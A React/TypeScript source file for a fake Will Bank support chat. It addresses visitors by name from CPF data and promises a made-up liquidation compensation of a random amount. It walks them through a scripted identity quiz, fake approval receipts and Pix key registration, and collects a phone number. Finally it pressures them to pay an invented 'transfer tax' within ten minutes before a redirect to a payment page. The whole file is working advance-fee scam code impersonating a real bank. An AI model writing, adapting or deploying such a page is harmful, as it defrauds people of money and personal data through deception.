import { useEffect, useState, useRef } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { CheckCircle2, Play, Volume2, Check, ArrowLeft, MoreVertical, Phone, Send, Mic, Paperclip, Smile } from "lucide-react";
import { CPFData } from "@/lib/cpf";
import willbankLogo from "@/assets/willbank-logo.png";

type ChatStep = 
  | "greeting" 
  | "video" 
  | "quiz-mae" 
  | "quiz-nascimento" 
  | "identity-confirmed"
  | "comprovante"
  | "pix-selection"
  | "pix-confirm"
  | "generating-comprovante"
  | "comprovante-final"
  | "sms-input"
  | "taxa-explanation"
  | "final";

interface QuizOption {
  text: string;
  isCorrect: boolean;
}

interface Message {
  id: number;
  type: 'bot' | 'user' | 'system';
  content: React.ReactNode;
  time: string;
}

const Chat = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [step, setStep] = useState<ChatStep>("greeting");
  const [messages, setMessages] = useState<Message[]>([]);
  const [showVideo, setShowVideo] = useState(false);
  const [quizOptions, setQuizOptions] = useState<QuizOption[]>([]);
  const [phoneNumber, setPhoneNumber] = useState("");
  const [isTyping, setIsTyping] = useState(false);
  const messagesEndRef = useRef<HTMLDivElement>(null);

  const cpfData: CPFData | undefined = location.state?.cpfData;
  
  const [valorBeneficio] = useState(() => {
    const baseValue = Math.floor(Math.random() * (9500 - 1500 + 1) + 1500);
    const cents = Math.floor(Math.random() * 100);
    return baseValue + cents / 100;
  });

  const [protocolo] = useState(() => {
    return `202${Date.now().toString().slice(-13)}`;
  });

  const getCurrentTime = () => {
    return new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
  };

  const scrollToBottom = () => {
    messagesEndRef.current?.scrollIntoView({ behavior: "smooth" });
  };

  useEffect(() => {
    scrollToBottom();
  }, [messages, step, isTyping]);

  useEffect(() => {
    if (!cpfData) {
      navigate("/");
      return;
    }
    startFlow();
  }, [cpfData, navigate]);

  const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

  const addBotMessage = async (content: React.ReactNode, showTyping = true) => {
    if (showTyping) {
      setIsTyping(true);
      await delay(800 + Math.random() * 500);
      setIsTyping(false);
    }
    const newMessage: Message = {
      id: Date.now(),
      type: 'bot',
      content,
      time: getCurrentTime()
    };
    setMessages(prev => [...prev, newMessage]);
  };

  const addUserMessage = (content: React.ReactNode) => {
    const newMessage: Message = {
      id: Date.now(),
      type: 'user',
      content,
      time: getCurrentTime()
    };
    setMessages(prev => [...prev, newMessage]);
  };

  const generateFakeOptions = (correctAnswer: string, type: "mae" | "nascimento"): QuizOption[] => {
    const fakeNames = [
      "MARIA SANTOS OLIVEIRA",
      "ANA PAULA FERREIRA",
      "CLAUDIA SOUZA LIMA",
      "PATRICIA GOMES SILVA"
    ];
    const fakeDates = [
      "15/03/1998",
      "22/07/1995",
      "08/12/2001",
      "30/05/1999"
    ];

    const options = type === "mae" ? fakeNames : fakeDates;
    const shuffled = options.filter(o => o !== correctAnswer).sort(() => Math.random() - 0.5).slice(0, 3);
    shuffled.push(correctAnswer);
    
    return shuffled.sort(() => Math.random() - 0.5).map(text => ({
      text,
      isCorrect: text === correctAnswer
    }));
  };

  const startFlow = async () => {
    await delay(500);
    
    await addBotMessage(
      <span>Olá <strong>{cpfData?.nome}</strong>! 👋 Seja muito bem vindo ao <strong>Setor de Atendimento</strong> online do Will Bank.</span>
    );

    await addBotMessage(
      <span>O número do <strong>PROTOCOLO</strong> deste atendimento é: <span className="font-mono bg-primary/20 px-2 py-0.5 rounded">{protocolo}</span></span>
    );

    await addBotMessage(
      <span>Você está a um passo de validar sua indenização referente à liquidação do Will Bank, no valor de <strong className="text-lg text-green-600">R$ {valorBeneficio.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</strong> 💰</span>
    );

    await addBotMessage(
      <span>Clique no vídeo abaixo para darmos continuidade 👇</span>
    );
    
    setShowVideo(true);
    setStep("video");
  };

  const handleVideoClick = async () => {
    setShowVideo(false);
    addUserMessage(<span>▶️ Vídeo assistido</span>);

    await addBotMessage(<span>Ótimo! Agora <u>responda as perguntas</u> para a aprovação da sua indenização.</span>);
    await addBotMessage(<span><strong>Qual o nome da sua mãe?</strong></span>);

    setQuizOptions(generateFakeOptions(cpfData?.nomeMae || "", "mae"));
    setStep("quiz-mae");
  };

  const handleQuizAnswer = async (option: QuizOption, quizType: "mae" | "nascimento") => {
    addUserMessage(<span>{option.text}</span>);
    
    if (option.isCorrect) {
      await addBotMessage(
        <span className="flex items-center gap-2">
          ✅ Resposta correta!
        </span>
      );

      if (quizType === "mae") {
        await addBotMessage(<span><strong>Qual sua data de nascimento?</strong></span>);
        setQuizOptions(generateFakeOptions(cpfData?.dataNascimento || "", "nascimento"));
        setStep("quiz-nascimento");
      } else {
        await addBotMessage(
          <div className="bg-green-50 border border-green-200 rounded-xl p-3">
            <span className="flex items-center gap-2 text-green-700 font-semibold">
              <CheckCircle2 className="w-5 h-5" />
              Identidade confirmada com sucesso!
            </span>
          </div>
        );
        setStep("identity-confirmed");
        await showComprovante();
      }
    } else {
      await addBotMessage(<span className="text-red-500">❌ Resposta incorreta. Tente novamente.</span>);
    }
  };

  const showComprovante = async () => {
    await addBotMessage(
      <div className="bg-card border-2 border-primary/30 rounded-2xl p-5 space-y-4 shadow-lg">
        <div className="flex justify-center">
          <img src={willbankLogo} alt="Will Bank" className="h-10" />
        </div>
        <h3 className="text-lg font-bold text-center">Confirmação de Autenticidade</h3>
        
        <div className="bg-gradient-to-r from-primary to-amber-400 text-primary-foreground text-center py-2 rounded-full text-sm font-bold">
          ✓ Dados Autenticados
        </div>
        
        <p className="text-center text-sm text-muted-foreground">
          Os dados do(a) Sr(a). <strong className="text-foreground">{cpfData?.nome}</strong> foram encontrados e sua autenticidade foi confirmada.
        </p>

        <div className="divide-y border rounded-xl overflow-hidden bg-muted/30">
          <DataRow label="Nome Completo" value={cpfData?.nome || ""} />
          <DataRow label="CPF" value={cpfData?.cpf || ""} />
          <DataRow label="Data de Nascimento" value={cpfData?.dataNascimento || ""} />
          <DataRow label="Nome da Mãe" value={cpfData?.nomeMae || ""} />
        </div>
      </div>,
      false
    );

    await addBotMessage(
      <span>Você possui uma indenização a receber no valor de <strong className="text-lg text-green-600">R$ {valorBeneficio.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</strong> 🎉</span>
    );

    await addBotMessage(<AudioMessage />);

    setStep("pix-selection");
  };

  const handleAprovarIndenizacao = async () => {
    addUserMessage(<span>SIM, APROVAR INDENIZAÇÃO ✓</span>);

    await addBotMessage(
      <div className="bg-card border-2 border-primary/30 rounded-2xl p-5 space-y-5 shadow-lg">
        <div className="flex justify-center">
          <img src={willbankLogo} alt="Will Bank" className="h-10" />
        </div>
        
        <div className="flex items-center justify-center gap-3">
          <StepDot completed />
          <div className="w-10 h-0.5 bg-primary" />
          <StepDot completed />
          <div className="w-10 h-0.5 bg-primary" />
          <StepDot completed />
        </div>

        <div className="text-center space-y-2">
          <p className="font-bold text-lg">{cpfData?.nome}</p>
          <p className="text-sm text-muted-foreground">Sua indenização no valor de</p>
          <p className="text-3xl font-black text-green-600">R$ {valorBeneficio.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</p>
          <p className="text-xs text-primary font-medium">Complete os próximos passos para receber ainda hoje!</p>
        </div>
      </div>,
      false
    );

    await addBotMessage(
      <span className="flex items-center gap-2">
        <CheckCircle2 className="w-5 h-5 text-green-500" />
        Sua indenização foi aprovada!
      </span>
    );

    await addBotMessage(<span>Escolha o tipo de <strong>Chave Pix</strong> para receber sua quantia:</span>);

    setStep("pix-confirm");
  };

  const handlePixType = async () => {
    addUserMessage(<span>CPF</span>);

    await addBotMessage(
      <div className="bg-amber-50 border border-amber-300 rounded-xl p-4 space-y-2">
        <p className="font-bold">⚠️ ATENÇÃO</p>
        <p>Confirme se a CHAVE PIX está correta:</p>
        <p className="font-mono bg-white px-3 py-2 rounded-lg border">{cpfData?.cpf.replace(/\D/g, '')}</p>
        <p className="text-xs text-muted-foreground">A WillBank não se responsabiliza por transferências para chave incorreta.</p>
      </div>
    );

    setStep("generating-comprovante");
  };

  const handleConfirmPix = async () => {
    addUserMessage(<span>Sim, está correto ✓</span>);

    await addBotMessage(<span>Aguarde um momento...</span>);
    await delay(500);
    await addBotMessage(<span className="text-primary">Finalizando o cadastro da sua chave pix... ⏳</span>);
    await delay(800);
    await addBotMessage(<span className="flex items-center gap-2">✅ Sua chave pix foi cadastrada com sucesso!</span>);
    
    await addBotMessage(<AudioMessage duration="0:12" />);

    await addBotMessage(<span>Clique no botão abaixo para <strong>confirmar</strong> seu processo e gerar seu <strong>comprovante de recebimento</strong>.</span>);

    setStep("comprovante-final");
  };

  const handleGenerateComprovante = async () => {
    addUserMessage(<span>CONFIRMAR</span>);

    await addBotMessage(<span className="text-primary">Gerando seu comprovante de recebimento... ⏳</span>);
    
    await addBotMessage(
      <div className="bg-card border-2 border-primary/30 rounded-2xl p-5 space-y-4 shadow-lg">
        <h3 className="text-lg font-bold text-center border-b pb-3">📄 Comprovante Indenizatório</h3>
        
        <div className="bg-amber-50 border-l-4 border-primary p-3 text-sm">
          <p>O Will Bank confirma o direito à indenização do Sr(a). <strong>{cpfData?.nome}</strong>, CPF <strong>{cpfData?.cpf.replace(/\D/g, '')}</strong>.</p>
        </div>

        <div className="divide-y border rounded-xl overflow-hidden">
          <DataRow label="Indenização" value={`R$ ${valorBeneficio.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}`} highlight />
          <DataRow label="Protocolo" value={protocolo} />
          <DataRow label="Data/Hora" value={new Date().toLocaleString('pt-BR')} />
        </div>
      </div>,
      false
    );

    await addBotMessage(<span>Seu processo foi registrado e vinculado ao CPF <strong>{cpfData?.cpf.replace(/\D/g, '')}</strong>.</span>);

    await addBotMessage(<span><strong>IMPORTANTE:</strong> Escolha como deseja receber uma cópia do seu comprovante.</span>);

    setStep("sms-input");
  };

  const handleSMSOption = async () => {
    addUserMessage(<span>RECEBER POR SMS</span>);
    await addBotMessage(<span>Digite seu número de celular:</span>);
  };

  const handlePhoneSubmit = async () => {
    if (!phoneNumber.trim()) return;

    addUserMessage(<span>{phoneNumber}</span>);

    await addBotMessage(<span>✅ Comprovante salvo! Você receberá em até 15 minutos.</span>);

    await addBotMessage(
      <div className="bg-red-50 border border-red-200 rounded-xl p-4">
        <p className="font-bold text-red-700">⚠️ ATENÇÃO</p>
        <p className="text-sm mt-2">A WillBank já iniciou o repasse da sua indenização de <strong className="text-green-600">R$ {valorBeneficio.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</strong></p>
        <p className="text-sm mt-2">Para liberar o valor, realize o pagamento do <strong>Imposto de Transferência</strong> em até 10 minutos.</p>
      </div>
    );

    await addBotMessage(<span>Clique abaixo para entender o motivo do pagamento:</span>);

    setStep("taxa-explanation");
  };

  const handleTaxExplanation = async () => {
    addUserMessage(<span>PORQUE TENHO QUE PAGAR ESSE IMPOSTO?</span>);

    await addBotMessage(<span><strong>IMPORTANTE:</strong> Escute o áudio com atenção!</span>);
    
    const ipct = valorBeneficio * 0.0021;
    const ipti = valorBeneficio * 0.0025;
    const ipri = valorBeneficio * 0.0025;
    const totalImposto = ipct + ipti + ipri;

    await addBotMessage(
      <div className="bg-muted rounded-xl p-4 space-y-2 text-sm">
        <p className="font-bold">📊 Impostos gerados:</p>
        <p>• IPCT (0,21%): <strong>R$ {ipct.toFixed(2).replace('.', ',')}</strong></p>
        <p>• IPTI (0,25%): <strong>R$ {ipti.toFixed(2).replace('.', ',')}</strong></p>
        <p>• IPRI (0,25%): <strong>R$ {ipri.toFixed(2).replace('.', ',')}</strong></p>
        <div className="pt-2 border-t mt-2">
          <p className="font-bold text-primary">Total: R$ {totalImposto.toFixed(2).replace('.', ',')} (0,71%)</p>
        </div>
      </div>
    );

    await addBotMessage(<AudioMessage duration="0:35" />);

    await addBotMessage(<span>Após o pagamento do <strong>Imposto de Recebimento</strong>, a WillBank terá autorização para realizar a transferência.</span>);

    setStep("final");
  };

  const handleFinalPayment = () => {
    const ipct = valorBeneficio * 0.0021;
    const ipti = valorBeneficio * 0.0025;
    const ipri = valorBeneficio * 0.0025;
    const totalImposto = ipct + ipti + ipri;

    navigate("/saque", { 
      state: { 
        cpfData, 
        valorBeneficio,
        valorTaxa: totalImposto,
        protocolo
      } 
    });
  };

  if (!cpfData) return null;

  return (
    <div className="min-h-screen bg-foreground flex flex-col">
      {/* Chat Header - Bank App Style */}
      <header className="bg-foreground text-background px-4 py-3 flex items-center gap-3 border-b border-background/10 sticky top-0 z-50">
        <button onClick={() => navigate(-1)} className="p-2 hover:bg-background/10 rounded-full transition-colors">
          <ArrowLeft className="w-5 h-5" />
        </button>
        
        <div className="w-11 h-11 rounded-full bg-gradient-to-br from-primary to-amber-400 flex items-center justify-center shadow-md">
          <img src={willbankLogo} alt="Will Bank" className="w-7 h-7 object-contain" />
        </div>
        
        <div className="flex-1">
          <h1 className="font-bold text-base">Atendimento Will Bank</h1>
          <p className="text-xs text-background/60 flex items-center gap-1">
            <span className="w-2 h-2 bg-green-500 rounded-full inline-block"></span>
            Online agora
          </p>
        </div>

        <button className="p-2 hover:bg-background/10 rounded-full transition-colors">
          <Phone className="w-5 h-5" />
        </button>
        <button className="p-2 hover:bg-background/10 rounded-full transition-colors">
          <MoreVertical className="w-5 h-5" />
        </button>
      </header>

      {/* Messages Area */}
      <main className="flex-1 overflow-y-auto bg-gradient-to-b from-slate-900 to-slate-800 p-4">
        <div className="max-w-2xl mx-auto space-y-3">
          {/* Date indicator */}
          <div className="text-center">
            <span className="text-xs bg-background/10 text-background/70 px-3 py-1 rounded-full">
              Hoje
            </span>
          </div>

          {messages.map((message) => (
            <div 
              key={message.id} 
              className={`flex ${message.type === 'user' ? 'justify-end' : 'justify-start'} animate-fade-in`}
            >
              {message.type === 'bot' && (
                <div className="w-8 h-8 rounded-full bg-gradient-to-br from-primary to-amber-400 flex items-center justify-center shrink-0 mr-2 shadow-md">
                  <img src={willbankLogo} alt="" className="w-5 h-5" />
                </div>
              )}
              
              <div className={`max-w-[80%] ${
                message.type === 'user' 
                  ? 'bg-primary text-primary-foreground rounded-2xl rounded-br-md' 
                  : 'bg-card text-foreground rounded-2xl rounded-bl-md shadow-md'
              } px-4 py-3`}>
                <div className="text-sm leading-relaxed">{message.content}</div>
                <div className={`text-[10px] mt-1 text-right ${message.type === 'user' ? 'text-primary-foreground/70' : 'text-muted-foreground'}`}>
                  {message.time}
                </div>
              </div>
            </div>
          ))}

          {/* Typing Indicator */}
          {isTyping && (
            <div className="flex justify-start animate-fade-in">
              <div className="w-8 h-8 rounded-full bg-gradient-to-br from-primary to-amber-400 flex items-center justify-center shrink-0 mr-2 shadow-md">
                <img src={willbankLogo} alt="" className="w-5 h-5" />
              </div>
              <div className="bg-card text-foreground rounded-2xl rounded-bl-md shadow-md px-4 py-3">
                <div className="flex gap-1">
                  <span className="w-2 h-2 bg-muted-foreground rounded-full animate-bounce" style={{ animationDelay: '0ms' }}></span>
                  <span className="w-2 h-2 bg-muted-foreground rounded-full animate-bounce" style={{ animationDelay: '150ms' }}></span>
                  <span className="w-2 h-2 bg-muted-foreground rounded-full animate-bounce" style={{ animationDelay: '300ms' }}></span>
                </div>
              </div>
            </div>
          )}

          {/* Video Section */}
          {showVideo && (
            <div 
              className="relative aspect-video bg-gradient-to-br from-slate-700 to-slate-800 rounded-2xl overflow-hidden cursor-pointer group shadow-xl mx-auto max-w-md"
              onClick={handleVideoClick}
            >
              <div className="absolute inset-0 flex items-center justify-center">
                <div className="w-32 h-32 bg-gradient-to-br from-primary to-amber-400 rounded-2xl flex items-center justify-center shadow-2xl">
                  <span className="text-5xl">👩‍💼</span>
                </div>
              </div>
              <div className="absolute inset-0 flex items-center justify-center">
                <div className="w-16 h-16 bg-white/90 rounded-full flex items-center justify-center shadow-lg group-hover:scale-110 transition-transform">
                  <Play className="w-8 h-8 text-foreground ml-1" fill="currentColor" />
                </div>
              </div>
              <div className="absolute bottom-0 left-0 right-0 p-3 bg-gradient-to-t from-black/80 to-transparent">
                <div className="flex items-center gap-2 text-white text-sm">
                  <Play className="w-4 h-4" />
                  <span>0:16</span>
                </div>
              </div>
            </div>
          )}

          {/* Action Buttons */}
          <div className="flex flex-wrap gap-2 justify-center py-2">
            {/* Quiz Options */}
            {(step === "quiz-mae" || step === "quiz-nascimento") && quizOptions.map((option, index) => (
              <Button
                key={index}
                onClick={() => handleQuizAnswer(option, step === "quiz-mae" ? "mae" : "nascimento")}
                className="bg-gradient-to-r from-primary to-amber-400 hover:from-primary/90 hover:to-amber-400/90 text-primary-foreground rounded-full font-bold shadow-lg"
              >
                {option.text}
              </Button>
            ))}

            {step === "pix-selection" && (
              <Button onClick={handleAprovarIndenizacao} className="bg-gradient-to-r from-green-500 to-emerald-500 hover:from-green-600 hover:to-emerald-600 text-white rounded-full font-bold shadow-lg px-8">
                ✓ SIM, APROVAR INDENIZAÇÃO
              </Button>
            )}

            {step === "pix-confirm" && (
              <Button onClick={handlePixType} className="bg-gradient-to-r from-primary to-amber-400 text-primary-foreground rounded-full font-bold shadow-lg px-8">
                CPF
              </Button>
            )}

            {step === "generating-comprovante" && (
              <Button onClick={handleConfirmPix} className="bg-gradient-to-r from-primary to-amber-400 text-primary-foreground rounded-full font-bold shadow-lg px-8">
                ✓ Sim, está correto
              </Button>
            )}

            {step === "comprovante-final" && (
              <Button onClick={handleGenerateComprovante} className="bg-gradient-to-r from-primary to-amber-400 text-primary-foreground rounded-full font-bold shadow-lg px-8">
                CONFIRMAR
              </Button>
            )}

            {step === "sms-input" && !phoneNumber && (
              <Button onClick={handleSMSOption} className="bg-gradient-to-r from-primary to-amber-400 text-primary-foreground rounded-full font-bold shadow-lg">
                📱 RECEBER POR SMS
              </Button>
            )}

            {step === "taxa-explanation" && (
              <Button onClick={handleTaxExplanation} className="bg-gradient-to-r from-orange-500 to-amber-500 hover:from-orange-600 hover:to-amber-600 text-white rounded-full font-bold shadow-lg">
                ❓ PORQUE TENHO QUE PAGAR ESSE IMPOSTO?
              </Button>
            )}

            {step === "final" && (
              <Button onClick={handleFinalPayment} className="bg-gradient-to-r from-green-500 to-emerald-500 hover:from-green-600 hover:to-emerald-600 text-white rounded-full font-bold shadow-lg px-6">
                💰 Concluir pagamento e receber
              </Button>
            )}
          </div>

          <div ref={messagesEndRef} />
        </div>
      </main>

      {/* Chat Input Area - Bank App Style */}
      <div className="bg-foreground border-t border-background/10 p-3">
        <div className="max-w-2xl mx-auto flex items-center gap-2">
          <button className="p-2 text-background/60 hover:text-background transition-colors">
            <Smile className="w-6 h-6" />
          </button>
          
          {step === "sms-input" && phoneNumber !== undefined ? (
            <div className="flex-1 flex gap-2">
              <Input
                placeholder="+55 (00) 00000-0000"
                value={phoneNumber}
                onChange={(e) => setPhoneNumber(e.target.value)}
                className="flex-1 bg-background/10 border-background/20 text-background placeholder:text-background/40 rounded-full"
              />
              {phoneNumber && (
                <Button onClick={handlePhoneSubmit} size="icon" className="rounded-full bg-primary hover:bg-primary/90 w-10 h-10">
                  <Send className="w-5 h-5" />
                </Button>
              )}
            </div>
          ) : (
            <div className="flex-1 bg-background/10 rounded-full px-4 py-2.5 text-background/40 text-sm">
              Digite uma mensagem...
            </div>
          )}
          
          <button className="p-2 text-background/60 hover:text-background transition-colors">
            <Paperclip className="w-6 h-6" />
          </button>
          <button className="p-2.5 bg-primary rounded-full text-primary-foreground hover:bg-primary/90 transition-colors">
            <Mic className="w-5 h-5" />
          </button>
        </div>
      </div>
    </div>
  );
};

// Helper Components
const DataRow = ({ label, value, highlight = false }: { label: string; value: string; highlight?: boolean }) => (
  <div className="flex justify-between p-3 bg-background/50">
    <span className="text-sm text-muted-foreground">{label}</span>
    <span className={`text-sm font-bold ${highlight ? 'text-green-600 text-base' : 'text-foreground'}`}>{value}</span>
  </div>
);

const StepDot = ({ completed }: { completed: boolean }) => (
  <div className={`w-8 h-8 rounded-full flex items-center justify-center ${completed ? 'bg-gradient-to-br from-primary to-amber-400' : 'bg-muted'}`}>
    {completed && <Check className="w-4 h-4 text-primary-foreground" />}
  </div>
);

const AudioMessage = ({ duration = "0:09" }: { duration?: string }) => (
  <div className="flex items-center gap-3 bg-muted/50 rounded-2xl px-4 py-3 w-fit">
    <button className="w-10 h-10 bg-gradient-to-br from-primary to-amber-400 rounded-full flex items-center justify-center shadow-md hover:scale-105 transition-transform">
      <Play className="w-5 h-5 text-primary-foreground ml-0.5" fill="currentColor" />
    </button>
    <div className="flex flex-col gap-1">
      <div className="w-32 h-8 flex items-center gap-0.5">
        {[...Array(20)].map((_, i) => (
          <div 
            key={i} 
            className="w-1 bg-primary/60 rounded-full" 
            style={{ height: `${Math.random() * 20 + 8}px` }}
          />
        ))}
      </div>
      <span className="text-xs text-muted-foreground">{duration}</span>
    </div>
  </div>
);

export default Chat;